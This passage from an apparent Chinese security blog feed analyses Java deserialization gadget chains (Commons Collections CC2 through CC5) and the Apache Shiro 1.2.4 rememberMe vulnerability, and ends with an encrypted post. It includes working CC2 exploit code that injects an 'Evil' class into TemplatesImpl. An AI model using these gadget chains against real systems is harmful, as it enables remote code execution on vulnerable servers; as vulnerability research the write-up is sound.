class="comment">//在staict块中添加cmd语句并加入到类的末尾</span></span><br><span class="line">       ctc.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">       <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">       <span class="comment">//设置类的名称</span></span><br><span class="line">       ctc.setName(<span class="string">&quot;Evil&quot;</span> + System.nanoTime());</span><br><span class="line">       <span class="comment">//获取到父类对象</span></span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">       <span class="comment">//设置创建类的父类</span></span><br><span class="line">       ctc.setSuperclass(superC);</span><br><span class="line">       <span class="comment">//写入class文;</span></span><br><span class="line">       <span class="type">byte</span>[] classBytes = ctc.toBytecode();</span><br><span class="line"></span><br><span class="line">       <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">       <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">       field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       field.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">       field = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       field.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">       <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">       PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,comparator);</span><br><span class="line">       queue.add(<span class="number">1</span>);</span><br><span class="line">       queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//反射修改方法为newTransformer</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">       field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       field1.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">       field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       Object[] queueArray = (Object[]) field2.get(queue);</span><br><span class="line">       queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">       queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc2&quot;</span>));</span><br><span class="line">           outputStream.writeObject(queue);</span><br><span class="line">           outputStream.close();</span><br><span class="line"></span><br><span class="line">           <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc2&quot;</span>));</span><br><span class="line">           inputStream.readObject();</span><br><span class="line">       &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16085367439225.jpg"                        alt="-w797"                 ></p><h3 id="Commons-Collections3"><a href="#Commons-Collections3" class="headerlink" title="Commons Collections3"></a>Commons Collections3</h3><p>cc3像是cc1与cc2的结合，仅做了两个改动,分别是：</p><ul><li><code>TrAXFilter</code></li><li><code>InstantiateTransformer</code></li></ul><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16091485266705.jpg"                        alt="-w804"                 ><br><strong>TrAXFilter：</strong><br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16091488068863.jpg"                        alt="-w858"                 ><br>在<code>TrAXFilter</code>的构造方法中执行了<code>templates.newTransformer</code>的方法。<br><strong>InstantiateTransformer:</strong></p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16091490728475.jpg"                        alt="-w1104"                 ><br>    在<code>InstantiateTransformer</code>类的最后创建了<code>input</code>的实例，在结合<code>TrAXFilter</code>类，设置<code>input</code>参数为<code>TrAXFilter</code>类，那么就可以在执行<code>InstantiateTransformer.transform</code>方法中创建<code>TrAXFilter</code>类的构造方法从而触发<code>templates.newTransformer()</code>方法。</p><p>Gadget:</p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16092277585539.jpg"                        alt="cc3"                 ></p><h3 id="Commons-Collections4"><a href="#Commons-Collections4" class="headerlink" title="Commons Collections4"></a>Commons Collections4</h3><p>cc4是cc2于cc3的结合，只是将<code>InvokerTransformer</code>替换为<code>InstantiateTransformer</code>其他没有什么变化。</p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/07/05/16093964104092.jpg"                        alt="-w1057"                 ></p><h3 id="Commons-Collections5"><a href="#Commons-Collections5" class="headerlink" title="Commons Collections5"></a>Commons Collections5</h3><h4 id="Gadget-Chain-3"><a href="#Gadget-Chain-3" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h4><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/07/05/16093964532431.jpg"                        alt="-w847"                 ></p><p>对比Commons Collections1,5只是变动了<code>AnnotationInvocationHandler</code>，引入了两个类：</p><ul><li><code>BadAttributeValueExpException</code></li><li><code>TiedMapEntry</code></li></ul><p>后半部分没有其他变化。</p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/07/05/16093965245152.jpg"                        alt="-w1265"                 ></p><p>在cc1中<code>AnnotationInvocationHandler</code>适用于触发<code>LazyMap.get</code>方法，那么cc5引入的这两个类是怎么触发的呢？<br><code>TiedMapEntry</code>:<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/07/05/16093969269374.jpg"                        alt="-w902"                 ><br>在<code>TiedMapEntry</code>类中有一个<code>Map</code>类型的<code>map</code>属性，并且在方法<code>getValue</code>中执行了<code>map.get</code>,同时在类中的<code>equals</code>、<code>hashCode</code>、<code>toString</code>方法中都调用了<code>getValue</code>方法。</p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/07/05/16093971549961.jpg"                        alt="-w967"                 ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;URLDNS&quot;&gt;&lt;a href=&quot;#URLDNS&quot; class=&quot;headerlink&quot; title=&quot;URLDNS&quot;&gt;&lt;/a&gt;URLDNS&lt;/h2&gt;&lt;p&gt;URLDNS经常用于快速检测反序列化漏洞是否存在的链，因为使用的原生类没有jdk版本限制。&lt;/p&gt;
&lt;h3 </summary>
      
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化分析</title>
    <link href="http://example.com/2021/12/01/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2021/12/01/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</id>
    <published>2021-12-01T13:58:40.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载shiro源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git</span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br><span class="line">cd ./shiro/samples/web</span><br></pre></td></tr></table></figure><p>修改pom文件，添加如下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--  需要设置编译的版本 --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">...</span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">.....</span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改完成后使用mvn命令编译war包：<code>mvn package -DskipTests</code>,在target目录下生成war包移动到tomcat webapps目录下启动Tomcat即可成功部署。<br>参考：<a class="link"   href="https://paper.seebug.org/shiro-rememberme-1-2-4/" >https://paper.seebug.org/shiro-rememberme-1-2-4/<i class="fas fa-external-link-alt"></i></a></p><h2 id="rememberMe反序列化分析"><a href="#rememberMe反序列化分析" class="headerlink" title="rememberMe反序列化分析"></a>rememberMe反序列化分析</h2><p>通过web.xml可以看到每次请求web都会进入到<code>ShiroFilter</code>,并进行相应的链式处理。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110475307552.jpg"                        alt="-w968"                 ><br>此filter的最上层为<code>javax.servlet.Filter</code>，即是Servlet规范中的<code>Filter</code>接口</p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110480709280.jpg"                        alt="-w457"                 ><br>在<code>org.apache.shiro.web.servlet.OncePerRequestFilter</code>正常流程最后会调用<code>doFilterInternal</code>方法。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110483320226.jpg"                        alt="-w1440"                 ><br>此方法为为一个抽象方法，那么实现应该是在其子类中，根据上面的<code>ShiroFilter</code>的继承图可看到<code>OncePerRequestFilter</code>的子类为<code>AbstractShiroFilter</code>.<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110491672114.jpg"                        alt="-w1321"                 ></p><p>  此方法中调用了<code>createSubject</code>方法跟进后发现是调用了<code>org.apache.shiro.subject</code>中的<code>buildSubject</code>方法<br>  <img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110493080704.jpg"                        alt="-w1440"                 ></p><p>继续跟进，<code>SecurityManager</code>是一个接口类实现方法中在<code>org.apache.shiro.mgt.DefaultSecurityManager</code> 中<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110495854684.jpg"                        alt="-w1440"                 ><br>其中又调用了<code>resolvePrincipals</code>方法，此方法调用了<code>getRememberedIdentity</code>方法，接着又调用了<code>RememberMeManager</code>的<code>getRememberedPrincipals</code>方法<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110497375205.jpg"                        alt="-w1378"                 ></p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110498535063.jpg"                        alt="-w1339"                 ><br>此类是一个接口类，实现在<code>AbstractRememberMeManager</code>类中<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110500585643.jpg"                        alt="-w1440"                 ><br>此方法中主要调用了三个方法</p><ol><li><code>getRememberedSerializedIdentity</code></li><li><code>convertBytesToPrincipals</code></li><li><code>onRememberedPrincipalFailure</code></li></ol><p><strong>getRememberedSerializedIdentity</strong>：<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110502471345.jpg"                        alt="-w859"                 ><br>此方法为抽象方法实现在其子类<code>CookieRememberMeManager</code>中<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110503321375.jpg"                        alt="-w1440"                 ><br>在其构造方法中创建另一个名为<code>rememberMe</code>的cookie，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">CookieRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCookie</span>(<span class="string">&quot;rememberMe&quot;</span>);</span><br><span class="line">      cookie.setHttpOnly(<span class="literal">true</span>);</span><br><span class="line">      cookie.setMaxAge(<span class="number">31536000</span>);</span><br><span class="line">      <span class="built_in">this</span>.cookie = cookie;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>getRememberedSerializedIdentity</code>方法主要是获取了请求包中的<code>cookie</code>的内容，如果cookie中的<code>rememberMe</code>的值不为<code>deleteMe</code>则进行base64解密返回。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110505452170.jpg"                        alt="-w1440"                 ></p><p>接着回到<code>getRememberedPrincipals</code>方法中来，如果<code>getRememberedSerializedIdentity</code>返回的内容不为空则进入到<code>convertBytesToPrincipals</code>方法中。</p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110509503467.jpg"                        alt="-w1120"                 ><br>此方法先对<code>getRememberedSerializedIdentity</code>返回的内容进行解密，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">        <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">        <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="built_in">this</span>.getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, <span class="built_in">this</span>.getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> serialized;</span><br></pre></td></tr></table></figure><p>使用了AES加密<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110520546892.jpg"                        alt="-w1156"                 ><br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16111108740473.jpg"                        alt="-w1440"                 ></p><p>再然后进入到<code>deserialize</code>方法，实际是执行了<code>org.apache.shiro.io.DefaultSerializer</code>中的<code>deserialize</code>方法。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2021/11/11/16110511981305.jpg"                        alt="-w1440"                 ><br>可以明显的看到这里进行了反序列化操作。<br>回顾下cookie中的流程：<br>获取Cookie中的<code>rememberMe</code>字段的内容-&gt;base64解密一次-&gt;aes/cbc解密-&gt;反序列化</p><p>那么如果知道aes加密的key，将恶意代码序列化后加密放入cookie中的<code>rememberMe</code>字段中即可触发反序列化漏洞。 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;下载shiro源码&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c</summary>
      
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Shiro" scheme="http://example.com/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>九思OA</title>
    <link href="http://example.com/2021/12/01/%E4%B9%9D%E6%80%9DOA/"/>
    <id>http://example.com/2021/12/01/%E4%B9%9D%E6%80%9DOA/</id>
    <published>2021-12-01T13:55:57.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d7c20bae71b842f2f05c7c45511325ea32ec5a4bfd56883d4183f25c00dc21d3">4fb3d45e54deadd9aab1c3fab00ecedc13eb6e1347494925077c1d90941b194a7ec1182241e4d309110be0ca015071212289e08c0444587694ae43d253862a77b22003aff2d8fd77cb4546173f8f8976b465c7192fd8b090aa46066d9557f576143d9c6d43e8fbc4ffbf10bcc897fdf94c185e083db907387432301da19a64aae0af1d40379bb8d26b30c4e4fc5caac64818ddcab3e34dcde44c29c70a3721a8b9a7fd39295941f0f02938b86605facfdf1fb0e968a0d7eaf942b477fbe39adfe87c620ffa6e32d144e3b5cb0bdf1b14ea7c332da95bc524ccb843517165cca69dba9efdf9d8d9a3272ce0eeec588ee5a7939f7984ecbdf5b3e510e4fc47aa06e5abd9ab2e1cbf5e07d8bfe280fbacf6a1ab9aa75dce9fdd2c2d0ef143ee55156cf1df53970bd21f5f61a31cc028fb3943cf3247c3c21a428f6024769075ff19b04f9d61d7e70728b6dfb98920c602490659b84ddd1bc0f1a9ac2f1657f1e924a4da1df62a4924523e774bf69544913a7892452704c98530a9640f77a830058c24c45168cc2f7a98eab7705a445a44eba360e749f9b02c6aa2f6b483b609a13e37f9021922005a4189a5958236857d9e64804dc1c5b3f9544c332d903c8d581307c8812322b6e046c89eed52c45409800ad458f98cc38d006ad637ae81245a477cb55c84e26919016c925980270ec9a991f874ce69dc5fcca7f845be66b7b9b400f3f0e3fbc924cdd07dfc64c046f763d392d4f69868e3a38f6a1399e981f94ab63857606ce0d5b3c3391da14ab5125dead6c78200dabe072c57e61b795608a2c4a2771c688f9b62996ffc9bdfd9da79e091b2bafa4c191fc8578e8a63452b7981d21fd4a4ce6543c6e7627e30a762bcb417ebcf3021a258b73796e498b86a2a94de3055891343d0c1545716ce8b0f3a5fd2c980e6bdf04b10e67009e6f384db2c21fe3270e34231c8103334782893174a35bae73b79ed4042cca436d0ccfcdbd33db36142b1dcb58b75ae5d0ffa5a505d3ac8dd169233624d61bfffb405d05250cdda90802dbc3f0293cd14b824b1bc1e41b0cfe0fe4bdea89091c2eb2d8dd9b29f13c22fb1a754f3a851e8270f299f09ac4d8f246370a40b1b1ffef9f537c449088e2f3342f61dda591ff0ce9c4f4c2842b442d382859ba988b19d76c48fe90ba73b251b8f37f359b1bc2658f8d046eed8b2456d417103816443881699cc814eb53c491ba5332686b116a93a3e8793251cad144ee84aacb5b71aaef47cb7d1519d293f6f9fac255e3eb5b3ba1682d4aa801176e73ba6379902675976b657d426f3e08100a49d5763dca406bcd4abd65282459122119862f8d88f6fbd5fa36f17660edd0e3f1f67322cabbbca1abec0164cba9f3d740c207a4edca6d6b779fb05446a15b5efdba9a21a2b1f98140ff64809c9110917062710e50b8829c33c7056188d192d720220a6a3fd2c51ff426dfcd75b69e0083e876c94de373cea9033577de5fa10382dcfb294642c2d4335c37b9b1c0553ae5c2c1ddf5ba7f1d020ca67af469a13680f0decc77da7f2118e5fc0d5a9ebc8018d1ca7f4a1bd08ec65be8ee70c0c6b3c17a7c3312f4fb242b12e10329fbab312caa676aa63bc1a34b147ccab3d3166850ea2ee4c4fe4a050efd20006a98b8fe50be82392d0b23d785368b22d78c96c731ed990664c58f852e00185f923075a98c6c341658f7c390e11381db39a350d95ca388ad6893198bade4a2c47744549c85f9bfa270ba0284a42197f7a52ee28706ac47ff948b7f79472870a5a153f3cc5cb23ea3dfe7ebcd885a93e6e3fb298be64a5cc7b6873deeefa32b42c8caa8bae89daf360fd001b256d6d012ae99fa85566e768efc7038d356b5e3c458f694ac21027c43d37f0073f487858247a4196d280969f7df959a7fc53362cd777f8a2a432cd963cec97a990ed9fe0ad6b4f5e5d3a2ade3d18b7e6c17012a5863a54d88898152adc312ae16d90c6a32c114d302a954c8c0a254d05d2d62982128642a431103af7ee60a8dee4e48283af3ba14513ab982c11abf56744ce8337859703300b97e3b86c3378659e2861954dfdde7dce7b93afe0d59f546780129c1ec01105bf655aef13cdda66fd36e4a2d37b1ef90fcd490362a465ce5dc8204fc017b338b65d43cc5d1acb52997ad705d42c89c7c258779c7b36200ddbc4dde0ee4824882c04e7afbea66738a47b9bed22328a7f77429e1379c34500651cbb479b97ed0974f3256960a2dcff8b79e64b0200dc98ad2614c3a5c61bbb0b21a85dc2d87f11006acb834d7c4d2c410864c792bde822963163d07c3f57b5ad6217b4cb28c14259ac7b5b7b2348a346af525a51d5698e0a36a4b3bbc54f6e687563f01f853a53164204bd502528504e25da174996fe73f9e115bdc8346342cfe93072b1fcb756a5b51688c17833b1dafc3fa5c43510f25fe9718225573752fc905f75a1c0e755292cfcdcfcb4302f58f89ee3ffa783b4ab6a043ec2b8aa1b4239a82e94ed9ea18df67f75037a232c204c525949d698ede5c08cbadd81b0d40b864670196ab23b6f0a83536a5934a2c695e89efe15bf057ce50c38cdf33b159c5e215e1fd2cf04935cc08035282e0a25f9f0a8a4f621b6149ae37e6d23436290fb4521f7b5b0481a69b92a8b06d9eb44d011274927b65ce6b70cb5dec2b08d4ff15b993e02cf738a6b5b46759830082e136f5c2bfc72d0d35c7106d9ed6b12bc804985bb7f5cc660e8b8a6906ac2cee69eb6ca5ff7696b7e94f07c2156e0899e101961bfe6a1f0a00c4dcc092da5982e741af67a3a50694cf90dd76c441db770d3a9706c8eca4047302c3eb3fed44e1d915f1a8eaa9f7b89ee5c16abc9277bc5ac4266e2809e4efaa4e9f76b058a1e9a76833bc4a8fc440b4eade71ddef82722706467edf00161d684cea71fd7879ff3174f07d3e07676fe2c7cfe2e84f7b271ad9ae3c96e96bd2b6c6a9fc978054db0a04241fe4e5dc9e90ad7a373665bd6bd89bb57326c5da021d6aa91ef6b4e70dd96177efb5767bb9ff157fc87ef7ca2ec8fde5da2f5a811ec4c503862000a65e85ce168cf023783e184863055e995faa717542bec0a45059f4639364ffb1ee113216bc3ba5bc15549342d2da6387d90e7200667602bde8dce3844058b2d976308575b6a1782c1cd605067eb04b69df8cd15fab92f829d404ecad21e188caba97f0d393ee23cf489d65704feb0c469e7ea865beab0d342ab53fb607d37144f9a4dc8b0cbbe53d50066e8e4e789e19861113302b950cab7f8317c81930c86ec72c0f8c900e76a4f900a1684ea9f6336870ed8be12bd05840272fbdb7da4bbdccf4940bace3b240fe9d6ece7de70a9ba0a3e180456e555bf9cf7e9c98e54e2fad6d06955d29b7c612d4182a0ab3b893ec24b6dbee5e0eb4aea3ea777df0a81408756ed498eafef619756ee63f2ede625ccc2cd5e67c5a760ce2334c7a538236e791ea2cfeac8a30fc797f69ae197aef37ee828db6b5b6e3a4882abb1c20d5bc635270ccf61059f77b55382da04559107f4986525a246b76367b1016926c0558f5a7a6c92c888953500dac85b90e6f9f344a1a542a7ca83732a393cf8f638bfdf313bd4f2a0790d992790ba9f50fa1c5f825b383a5939b7601e87ac726dfd40597288ce9470e106329c48c805ff69e13cc400b5e869804f79cc828a2e3769e09f49a2b9e887121cb99023364905f89d0476cc0ad51234bf86243748cccee9c212df47888204006ecd445ea5db710b8a6ee03f6dbe442863479803fc22a7f3477537c6f9d34e1ab5a9f5afb10da16255fb482e13d7f12a84a335a0b5071067856afb5af2081e7ca71abe7564262b6bfacb5b5b83ec813a13b516f624500989c62fda3bcedd5c6d1b721e3657586c53cdffc501e4b58a22182d3a1cc8c3442e0df3f4f4da124b5d7af6292ba053f35e8b064811989e0f071d8adaf52497d4f52c2e1d94b4fa687a610a0ba6275359174797e9fb6e83c7b5c2f058a69715f9851b32a5569a453785a12bcbb77d019dcfb83690a01647130f9c9885c6c94e15980c1763644e94e28b25a99ca6f7e3f94294b79418fa859bf64b210159c5b58881a6dbeaf7c6205e286aadc9196a800f09836998a31521e1b931cd87db13161bc7b3045fc2665400ec4f906c42471644e9e8d7cbce380c4a70594da981f13bd676bdf3001fb8a92f5bd19f2505d8f17aa9021ed9c77e77716bb57bb53fa992c1b5306cdb34f50b633aa0630aaabc3c34dbe1d26503ae01f279be976e480bf60f1d4cb373eab6ac4f26d7fd8710b1392625c42a50a700bc60447ea06db0155c3263b0cfccdc94145c8e065afc4a86600e7148c0961282cfb9d984f24b859aa5af96fcb97caacdd2ced9e6235e912e0ebbf0ab76fed209e6342660ed8d4a6b3ab713b2d310966bc6cfda22285a9b4b4206daa5cfb7a5151607af296e364467bfbda09544ca828afe9d9ba9b2095d425c91e98d9693d23b12c6a1b7142145427394c4ae8989e4e3fb51bce1ee7fe8361cae2911263afbeccb6d04cafd90e0b43639a6ff61012e0f4ba8842fb01490743711019500700363f3e28ab052e8f3846d6a2b02fdfeca95878702796db15f4881091fbb3e37c8c66ad7d74c98ba58b74088274c6d3c4243ed3bf197ae7dec3424175aed7040a942ba06d834a0e06925c8a33512de6bec9853a9e72fc5df330276f1f66cd04827d2f912cd0ca09547605773b7c54c8f8fa22b2c5b091f1c0a4baa1a6181e00de94ff5b914b97fe4d3f761eee22ad4828ac751a10c102c57e0f1624d9f615d359d32c243e1a265b44c7207c27f78433cd77c3ee25650f847bb766018e7dcfe0827a6ca050e3585d118058563b7976b095dae3d3e458c00a82b765b1f1b6c73bdb239788e951464c75eb8fa7fe0eb02f51027969b7472db154a08ca2e69813a85859fd9db64ecf4e02ecad7b79b8de9c